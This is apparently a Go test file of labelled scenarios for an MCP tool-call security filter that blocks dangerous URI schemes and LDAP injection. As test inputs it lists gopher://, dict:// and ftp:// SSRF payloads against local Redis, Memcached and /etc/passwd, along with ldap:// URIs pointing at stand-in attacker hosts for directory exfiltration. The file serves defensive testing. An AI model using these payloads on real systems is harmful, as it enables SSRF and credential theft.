// Hand-curated MCP test scenarios for dangerous URI scheme coverage and LDAP injection.
// Issue #1937 — rotation theme 4 (resource-URI content scrutiny).
//
// Rules tested:
//   mcp-struct-block-dangerous-protocol-in-uri — file://, gopher://, dict:// in 'uri' arg (BLOCK)
//   mcp-struct-block-ldap-injection            — ldap:// and ldaps:// in url/uri args (BLOCK)
//
// Attack vectors:
//   - Dangerous protocol handlers in MCP resource tools use 'uri' not 'url'; existing
//     url-arg rule doesn't cover these. file:// bypasses path guards; gopher:// is an
//     SSRF pivot for Redis/Memcached; dict:// leaks internal service banners.
//   - LDAP URI injection enables credential extraction from Active Directory, forced LDAP
//     rebinding, and SSRF to LDAP endpoints on internal networks.

package scenarios

// URISchemeLDAPScenarios1937 covers dangerous URI scheme + LDAP injection attacks.
var URISchemeLDAPScenarios1937 = []Scenario{

	// ── TP: Dangerous protocol in 'uri' argument — gopher://, dict://, ftp:// (BLOCK) ──
	// Note: file:// is NOT included — it's a legitimate MCP resource scheme for workspace
	// file access. Credential-path rules already block sensitive file:// paths separately.

	{
		ID:               "MCP-TP-1937-001",
		ToolName:         "read_resource",
		Arguments:        map[string]interface{}{"uri": "gopher://127.0.0.1:6379/_INFO"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-struct-block-dangerous-protocol-in-uri",
		Description:      "read_resource with gopher:// uri targeting Redis — SSRF pivot via Gopher protocol, must BLOCK",
	},
	{
		ID:               "MCP-TP-1937-002",
		ToolName:         "fetch_resource",
		Arguments:        map[string]interface{}{"uri": "dict://localhost:11211/stats"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-struct-block-dangerous-protocol-in-uri",
		Description:      "fetch_resource with dict:// uri — Memcached banner leak via dict protocol pivot, must BLOCK",
	},
	{
		ID:               "MCP-TP-1937-003",
		ToolName:         "resources/read",
		Arguments:        map[string]interface{}{"uri": "ftp://127.0.0.1/etc/passwd"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-struct-block-dangerous-protocol-in-uri",
		Description:      "resources/read with ftp://loopback uri — internal service scanning via FTP, must BLOCK",
	},

	// ── TN: Benign 'uri' arguments — HTTPS, workspace file://, custom resource URIs ───
	// Note: these expect AUDIT (not ALLOW) because other rules audit resource fetch calls.
	// The goal here is to verify they are NOT blocked by the dangerous-protocol rule.

	{
		ID:               "MCP-TN-1937-001",
		ToolName:         "resources/read",
		Arguments:        map[string]interface{}{"uri": "https://api.example.com/resource/abc123"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-struct-block-dangerous-protocol-in-uri",
		Description:      "resources/read with HTTPS uri — legitimate resource fetch, must NOT be blocked by dangerous-protocol rule (AUDIT from other rules is ok)",
	},
	{
		ID:               "MCP-TN-1937-002",
		ToolName:         "read_resource",
		Arguments:        map[string]interface{}{"uri": "resources://memory/session/current"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-struct-block-dangerous-protocol-in-uri",
		Description:      "read_resource with custom resource:// uri scheme — legitimate MCP resource URI, must NOT be blocked (AUDIT from other rules is ok)",
	},
	{
		ID:               "MCP-TN-1937-010",
		ToolName:         "resources/read",
		Arguments:        map[string]interface{}{"uri": "file:///workspace/project/README.md"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-struct-block-dangerous-protocol-in-uri",
		Description:      "resources/read with workspace file:// uri — legitimate MCP file resource access, file:// is NOT blocked in uri arg (only sensitive paths are blocked by credential rules)",
	},

	// ── TP: LDAP URI injection in url argument (BLOCK) ─────────────────────────

	{
		ID:               "MCP-TP-1937-004",
		ToolName:         "search_users",
		Arguments:        map[string]interface{}{"url": "ldap://attacker.com/dc=corp,dc=com?*?sub?(uid=*)"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-struct-block-ldap-injection-url",
		Description:      "search_users with ldap:// url to attacker server — LDAP injection + exfil, must BLOCK",
	},
	{
		ID:               "MCP-TP-1937-005",
		ToolName:         "authenticate_user",
		Arguments:        map[string]interface{}{"uri": "ldaps://evil.example.com/cn=admin,dc=example,dc=com"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-struct-block-ldap-injection-uri",
		Description:      "authenticate_user with ldaps:// uri to evil server — forced LDAP rebinding, must BLOCK",
	},
	{
		ID:               "MCP-TP-1937-006",
		ToolName:         "lookup_directory",
		Arguments:        map[string]interface{}{"url": "ldap://127.0.0.1:389/dc=internal,dc=corp"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-struct-block-ldap-injection-url",
		Description:      "lookup_directory with ldap:// loopback url — SSRF to local LDAP service, must BLOCK",
	},

	// ── TN: Benign directory lookup via HTTPS API ───────────────────────────────
	// Note: these expect AUDIT (not ALLOW) because other rules audit http_request /
	// fetch_url / read_resource tool calls by name. Goal: verify NOT blocked by ldap rule.

	{
		ID:               "MCP-TN-1937-003",
		ToolName:         "search_users",
		Arguments:        map[string]interface{}{"url": "https://api.example.com/users?q=alice"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-struct-block-ldap-injection-url",
		Description:      "search_users with HTTPS API url — legitimate user search, must NOT be blocked by ldap rule (AUDIT from other rules is ok)",
	},
	{
		ID:               "MCP-TN-1937-004",
		ToolName:         "read_resource",
		Arguments:        map[string]interface{}{"uri": "https://directory.example.com/api/user/123"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-struct-block-ldap-injection-uri",
		Description:      "read_resource with HTTPS directory uri — legitimate directory API call, must NOT be blocked by ldap rule (AUDIT from other rules is ok)",
	},
}
